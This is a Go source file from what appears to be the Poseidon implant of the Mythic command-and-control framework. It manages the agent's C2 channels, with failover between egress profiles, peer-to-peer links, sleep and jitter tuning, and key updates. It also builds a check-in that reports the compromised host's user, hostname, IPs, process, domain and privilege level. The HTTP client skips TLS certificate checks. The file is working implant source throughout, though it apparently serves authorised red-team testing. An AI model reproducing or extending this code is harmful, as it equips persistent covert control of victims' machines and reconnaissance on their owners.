package profiles

import (
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/responses"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/functions"
	"log"
	"net/http"
	"strconv"
	// Poseidon

	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/structs"
)

// these are stamped in variables as part of build time
var (
	// UUID is a per-payload identifier assigned by Mythic during creation
	UUID string
	// egress_order is a dictionary of c2 profiles and their intended connection orders
	// this is input as a string from the compilation step, so we have to parse it out
	egress_order string
	// egress_failover is the method of determining how/when to swap to another c2 profile
	egress_failover string
	// failoverThresholdString
	failedConnectionCountThresholdString string
)

// these are internal representations and other variables
var (
	// currentConnectionID is which fallback profile we're currently running
	currentConnectionID = 0
	// failedConnectionCounts mapping of C2 profile to failed egress connection counts
	failedConnectionCounts map[string]int
	// failedConnectionCountThreshold is how many failed attempts before rotating c2 profiles
	failedConnectionCountThreshold = 10
	// egressOrder the priority for starting and running egress profiles
	egressOrder []string
	// MythicID is the callback UUID once this payload finishes staging
	MythicID = ""

	// availableC2Profiles map of C2 profile name to instance of that profile
	availableC2Profiles = make(map[string]structs.Profile)
)
var tr = &http.Transport{
	TLSClientConfig:   &tls.Config{InsecureSkipVerify: true},
	MaxIdleConns:      1,
	MaxConnsPerHost:   1,
	DisableKeepAlives: true,
}
var client = &http.Client{
	Transport: tr,
}

// RegisterAvailableC2Profile adds a C2 Profile to availableC2Profiles for use with Start()
func RegisterAvailableC2Profile(newProfile structs.Profile) {
	availableC2Profiles[newProfile.ProfileName()] = newProfile
}

// Initialize parses the connection order information and threshold counts from compilation
func Initialize() {
	egressOrderBytes, err := base64.StdEncoding.DecodeString(egress_order)
	if err != nil {
		log.Fatalf("Failed to parse egress order bytes")
	}
	err = json.Unmarshal(egressOrderBytes, &egressOrder)
	if err != nil {
		log.Fatalf("Failed to parse connection orders: %v", err)
	}
	failedConnectionCounts = make(map[string]int)
	for _, key := range egressOrder {
		failedConnectionCounts[key] = 0
	}
	failedConnectionCountThreshold, err = strconv.Atoi(failedConnectionCountThresholdString)
	if err != nil {
		utils.PrintDebug(fmt.Sprintf("Setting failedConnectionCountThreshold to 10: %v", err))
		failedConnectionCountThreshold = 10
	}
	utils.PrintDebug(fmt.Sprintf("Initial Egress order: %v", egressOrder))
}
func sliceContainsString(sl []string, s string) bool {
	for _, x := range sl {
		if x == s {
			return true
		}
	}
	return false
}

// Start kicks off one egress and the p2p profiles
func Start() {
	// start one egress
	installedC2 := []string{}
	// get a list of all installed c2 that match egress order
	for _, egressC2 := range egressOrder {
		if _, ok := availableC2Profiles[egressC2]; ok {
			installedC2 = append(installedC2, egressC2)
		}
	}
	// append to the end any installed c2 that wasn't listed in the egress order
	for c2, _ := range availableC2Profiles {
		if !sliceContainsString(installedC2, c2) {
			installedC2 = append(installedC2, c2)
		}
	}
	egressOrder = installedC2
	utils.PrintDebug(fmt.Sprintf("Fixed Egress order based on installed c2: %v", egressOrder))
	for val, egressC2 := range egressOrder {
		if val == currentConnectionID {
			foundCurrentConnection := false
			for availableC2, _ := range availableC2Profiles {
				if !availableC2Profiles[availableC2].IsP2P() && availableC2 == egressC2 {
					utils.PrintDebug(fmt.Sprintf("starting: %s\n", availableC2))
					go availableC2Profiles[availableC2].Start()
					foundCurrentConnection = true
					break
				}
			}
			if foundCurrentConnection {
				break
			} else {
				currentConnectionID = currentConnectionID + 1
				if currentConnectionID > len(availableC2Profiles) {
					utils.PrintDebug(fmt.Sprintf("currnetConnectionID > available profiles\n"))
					break
				}
			}
		}
	}

	// start p2p
	for c2, _ := range availableC2Profiles {
		if availableC2Profiles[c2].IsP2P() {
			utils.PrintDebug(fmt.Sprintf("starting: %s\n", c2))
			go availableC2Profiles[c2].Start()
		}
	}
	// wait forever
	forever := make(chan bool, 1)
	<-forever
}

// IncrementFailedConnection increments the failed connection counts for a specific c2 profile, potentially rotating to the next profile
func IncrementFailedConnection(c2Name string) {
	failedConnectionCounts[c2Name] += 1
	if failedConnectionCounts[c2Name] > failedConnectionCountThreshold {
		go StartNextEgress(c2Name)
		failedConnectionCounts[c2Name] = 0
	}
}

// StartNextEgress automatically called when failed connection count >= threshold
func StartNextEgress(failedConnectionC2Profile string) {
	// first stop the current egress
	utils.PrintDebug("Looping to start next egress protocol")
	for _, key := range egressOrder {
		if key == failedConnectionC2Profile {
			for c2, _ := range availableC2Profiles {
				if !availableC2Profiles[c2].IsP2P() && c2 == key {
					utils.PrintDebug(fmt.Sprintf("stopping: %s\n", c2))
					failedConnectionCounts[c2] = 0
					availableC2Profiles[c2].Stop()
					break
				}
			}
		}
	}
	egressC2StillRunning := false
	for c2, _ := range availableC2Profiles {
		if !availableC2Profiles[c2].IsP2P() && availableC2Profiles[c2].IsRunning() {
			egressC2StillRunning = true
		}
	}
	startedC2 := ""
	if !egressC2StillRunning {
		utils.PrintDebug(fmt.Sprintf("No more egress c2 profiles running, start the next\n"))
		// update the connectionID and wrap around if necessary
		if egress_failover == "failover" {
			currentConnectionID = (currentConnectionID + 1) % len(egressOrder)
		}
		// start the next egress
		for val, key := range egressOrder {
			if val == currentConnectionID {
				for c2, _ := range availableC2Profiles {
					if !availableC2Profiles[c2].IsP2P() && c2 == key {
						utils.PrintDebug(fmt.Sprintf("starting: %s\n", c2))
						startedC2 = c2
						failedConnectionCounts[c2] = 0
						go availableC2Profiles[c2].Start()
						break
					}
				}
			}
		}
	}
	if GetMythicID() != "" && startedC2 != "" && startedC2 != failedConnectionC2Profile {
		// we started a new c2 profile other than the one that just hit the failure count
		// send off a message to Mythic that the other connection channel is dead
		responses.P2PConnectionMessageChannel <- structs.P2PConnectionMessage{
			Source:        GetMythicID(),
			Destination:   GetMythicID(),
			Action:        "remove",
			C2ProfileName: failedConnectionC2Profile,
		}
		/*
			source := fmt.Sprintf("poseidon: %s", GetMythicID())
			level := structs.AlertLevelInfo
			utils.PrintDebug("adding alert to NewAlertChannel")
			responses.NewAlertChannel <- structs.Alert{
				Alert:  fmt.Sprintf("Poseidon, %s, Stopped C2 Profile '%s' and started '%s'", GetMythicID(), failedConnectionC2Profile, startedC2),
				Source: &source,
				Level:  &level,
			}

		*/
	}
}

// GetAllC2Info collects metadata about all compiled in c2 profiles
func GetAllC2Info() string {
	output := ""
	for c2, _ := range availableC2Profiles {
		output += availableC2Profiles[c2].ProfileName() + ":\n"
		output += availableC2Profiles[c2].GetConfig() + "\n"
	}
	return output
}

// SetAllEncryptionKeys makes sure all compiled c2 profiles are updated with callback encryption information
func SetAllEncryptionKeys(newKey string) {
	for c2, _ := range availableC2Profiles {
		utils.PrintDebug(fmt.Sprintf("Updating encryption keys for: %s", c2))
		availableC2Profiles[c2].SetEncryptionKey(newKey)
	}
}

// StartC2Profile starts a specific c2 profile by name (usually via tasking)
func StartC2Profile(profileName string) {
	for c2, _ := range availableC2Profiles {
		if c2 == profileName {
			utils.PrintDebug(fmt.Sprintf("Starting C2 profile by name from tasking: %s\n", profileName))
			go availableC2Profiles[c2].Start()
		}
	}
}

// StopC2Profile stops a specific c2 profile by name (usually via tasking)
func StopC2Profile(profileName string) {
	utils.PrintDebug(fmt.Sprintf("Stopping C2 profile by name from tasking: %s\n", profileName))
	for c2, _ := range availableC2Profiles {
		if c2 == profileName {
			utils.PrintDebug(fmt.Sprintf("stopping: %s\n", c2))
			failedConnectionCounts[c2] = 0
			availableC2Profiles[c2].Stop()
			break
		}
	}
	StartNextEgress(profileName)
}

// UpdateAllSleepInterval updates sleep interval for all compiled c2 profiles
func UpdateAllSleepInterval(newInterval int) string {
	output := ""
	for c2, _ := range availableC2Profiles {
		output += fmt.Sprintf("[%s] - %s", c2, availableC2Profiles[c2].SetSleepInterval(newInterval))
	}
	return output
}

// UpdateAllSleepJitter updates sleep jitter for all compiled c2 profiles
func UpdateAllSleepJitter(newJitter int) string {
	output := ""
	for c2, _ := range availableC2Profiles {
		output += fmt.Sprintf("[%s] - %s", c2, availableC2Profiles[c2].SetSleepJitter(newJitter))
	}
	return output
}

// UpdateC2Profile updates an arbitrary parameter/value for the specified c2 profile
func UpdateC2Profile(profileName string, argName string, argValue string) {
	for c2, _ := range availableC2Profiles {
		if c2 == profileName {
			availableC2Profiles[c2].UpdateConfig(argName, argValue)
		}
	}
}

// GetPushChannel gets the channel for the currently running c2 profile if one exists
func GetPushChannel() chan structs.MythicMessage {
	hasEgress := false
	for c2, _ := range availableC2Profiles {
		// try to find direct egress push channels first
		if !availableC2Profiles[c2].IsP2P() && availableC2Profiles[c2].GetPushChannel() != nil {
			return availableC2Profiles[c2].GetPushChannel()
		}
		if availableC2Profiles[c2].IsRunning() && !availableC2Profiles[c2].IsP2P() {
			hasEgress = true
		}
	}
	if !hasEgress {
		// we have no push egress and no direct egress at all, so check p2p
		for c2, _ := range availableC2Profiles {
			if availableC2Profiles[c2].IsP2P() && availableC2Profiles[c2].GetPushChannel() != nil {
				return availableC2Profiles[c2].GetPushChannel()
			}
		}
	}
	return nil
}

// GetSleepTime gets the sleep time for the currently running c2 profile
func GetSleepTime() int {
	for c2, _ := range availableC2Profiles {
		sleep := availableC2Profiles[c2].GetSleepTime()
		if sleep >= 0 {
			return sleep
		}
	}
	return 0
}

// GetMythicID returns the current Mythic UUID
func GetMythicID() string {
	return MythicID
}

func SetMythicID(newMythicID string) {
	utils.PrintDebug(fmt.Sprintf("Updating MythicID: %s -> %s\n", MythicID, newMythicID))
	MythicID = newMythicID
}

func CreateCheckinMessage() structs.CheckInMessage {
	currentUser := functions.GetUser()
	hostname := functions.GetHostname()
	currIP := functions.GetCurrentIPAddress()
	currPid := functions.GetPID()
	OperatingSystem := functions.GetOS()
	arch := functions.GetArchitecture()
	processName := functions.GetProcessName()
	domain := functions.GetDomain()
	checkin := structs.CheckInMessage{
		Action:       "checkin",
		IPs:          currIP,
		OS:           OperatingSystem,
		User:         currentUser,
		Host:         hostname,
		Pid:          currPid,
		UUID:         UUID,
		Architecture: arch,
		Domain:       domain,
		ProcessName:  processName,
	}

	if functions.IsElevated() {
		checkin.IntegrityLevel = 3
	} else {
		checkin.IntegrityLevel = 2
	}
	return checkin
}
